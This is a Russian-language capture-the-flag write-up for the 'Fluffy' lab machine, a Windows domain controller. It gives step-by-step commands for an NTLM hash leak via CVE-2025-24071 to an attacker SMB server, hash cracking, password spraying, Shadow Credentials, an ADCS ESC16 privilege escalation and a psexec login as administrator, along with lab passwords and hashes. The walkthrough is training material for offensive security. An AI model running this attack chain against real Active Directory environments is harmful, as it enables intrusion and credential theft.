# Fluffy

<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

## Содержание:

В описании машины была предоставлена учетная запись `j.fleischman`.  При сканировании с помощью `NetExec` была обнаружена доступная на чтение и запись шара `IT`. В ней находился `PDF`-документ, содержащий недавние `CVE`. Одну из них (`CVE-2025-24071`) получилось проэксплуатировать и получить `NTLM`-хеш пользователя `p.agila`. С помощью небезопасных списков доступа данная УЗ была добавлена в группу `"Service Accounts"`, а затем проэксплуатирована атака `Shadow Credentials`. С помощью УЗ `winrm_svc` можно подключиться к атакуемому хосту. После получения первоначального доступа было выявлено, что `ADCS` уязвим к технике `ESC16`, которая была успешно проэксплуатирована для повышения привилегий.

## Разведка:

Сканирование портов:

```bash
nmap -sC -sV -p- 10.10.11.69 -oN nmap.out
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-12 02:36:48Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-12T02:38:18+00:00; +6h01m47s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-12T02:38:19+00:00; +6h01m47s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-12T02:38:18+00:00; +6h01m47s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-12T02:38:19+00:00; +6h01m47s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
49746/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h01m46s, deviation: 0s, median: 6h01m46s
| smb2-time: 
|   date: 2025-07-12T02:37:38
|_  start_date: N/A
```

Внесение изменений в файл `/etc/hosts`:

```bash
10.10.11.69 DC01 FLUFFY.HTB DC01.FLUFFY.HTB
```

## Получение первоначального доступа (CVE-2025-24071)

В описании машины были даны  следующие данные `j.fleischman`/`J0elTHEM4n1990!` их валидность можно проверить с помощью `nxc`:

```bash
nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```

<figure><img src="../../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

Можно обнаружить, что данная УЗ имеет права `READ,WRITE` на шару `IT`. Для подключения к ней используется `impacket-smbclient`:

<figure><img src="../../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

Здесь стоит выделить `PDF`-файл. В нём описываются недавние `CVE`:

<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

Эксплуатируя уязвимость  `CVE-2025-24071`, можно получить `NTLM`-хеш пользователя, который распакует вредоносный архив. Его можно сгенерировать с помощью [следующего эксплоита](https://github.com/FOLKS-iwd/CVE-2025-24071-msfvenom). Инструкция по использованию дана в `GitHub`-репозитории:

* Установка

```bash
git clone https://github.com/FOLKS-IWD/CVE-2025-24071-msfvenom.git
cd CVE-2025-24071-msfvenom
cp ntlm_hash_leak.rb ~/.msf4/modules/auxiliary/server/
```

Если до этого был запущен `msfconsole`, то его следует перезапустить.

* Создание архива

```bash
set ATTACKER_IP 10.10.16.6
set FILENAME exploit.zip
set LIBRARY_NAME malicious.library-ms
set SHARE_NAME shared
run
```

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

* **Запуск `SMB`-сервера**

После того, как архив сгенерирован, требуется также запустить `SMB`-сервер, чтобы на него "прилетел" `NTLM`-хеш пользователя-жертвы:

```bash
use auxiliary/server/capture/smb
set SRVHOST 10.10.16.6
run
```

Далее нужно зайти на атакуемый `SMB`-сервер через `impacket-smbclient` и загрузить архив:

```bash
impacket-smbclient 'fluffy.htb/j.fleischman'@DC01
```

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Спустя некоторое время появится хеш пользователя `p.agila`:

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Сбрутить его можно с помощью утилиты `hashcat`:

```bash
sudo hashcat -m 5600 agila_hash /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Проверка валидности пароля через `nxc` (`Password Spraying`):

```bash
nxc smb 10.10.11.69 -u users.txt -p 'prometheusx-303' --continue-on-success
```

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

На графе bloodhound отображается, что пользователь `p.agila` является членом группы `"Service Accounts"`:

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

На самом деле это не совсем так, поскольку сбор данных для бх осуществлялся в то время, когда кто-то из игроков добавил уже данного пользователя в группу. Это можно сделать с помощью утилиты `bloodyAD`:

```bash
bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
```

Далее стоит обратить внимание на то, что все члены группы `"Service Accounts"` имеют `ACL` `GenericWrite` на пользователей `winrm_svc`, `ldap_svc` и `ca_svc`:

<figure><img src="../../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

Следовательно, можно проэксплуатировать атаку `Shadow Credentials` с помощью утилиты `certipy`, чтобы заполучить хеши этих пользователей:

```bash
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip DC01.fluffy.htb -k -ns 10.10.11.69 -account 'ldap_svc' auto
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip DC01.fluffy.htb -k -ns 10.10.11.69 -account 'winrm_svc' auto
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip DC01.fluffy.htb -k -ns 10.10.11.69 -account 'ca_svc' auto
```

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Поскольку пользователь `winrm_svc` является членом группы `"Remote Management Users"`, то можно подключиться к атакуемому хосту через `winrm`:

```bash
evil-winrm -i DC01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

## Повышение привилегий (ESC16)

Помимо хешей пользователей `winrm_svc` и `ldap_svc` был также получен хеш пользователя `ca_svc`, который состоит в группе `"Cert Publishers"`. С помощью утилиты `certipy` можно найти уязвимые сертификаты для `ADCS`:

```bash
certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout
```

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

Вывод утилиты показал присутствие уязвимости, которую можно проэксплуатировать с помощью техники `ESC16`.

1. Получение `NT`-хеша и `TGT`-билета пользователя `ca_svc`, затем экспорт последнего в переменную `KRB5CCNAME`:

```bash
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
export KRB5CCNAME=ca_svc.ccache
```

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

2. Обновление атрибута `userPrincipalName` пользователя `ca_svc`:

```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
```

<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

3. Сначала запрос сертификата оказался безуспешным:

```bash
certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
```

<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

Однако при использовании опции `-debug` сертификат пользователя `administrator` был получен (версия `certipy-ad 4.8.2`):

```bash
certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User' -debug
```

<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

4. Далее пользователю `ca_svc` можно вернуть атрибут обратно:

```bash
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

5. Извлечение `TGT`-билета и `NT`-хеша пользователя `administrator`:

```bash
certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

После получения `NT`-хеша можно подключиться через `psexec` от имени системы к атакуемой машине:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e Administrator@10.10.11.69
```

<figure><img src="../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
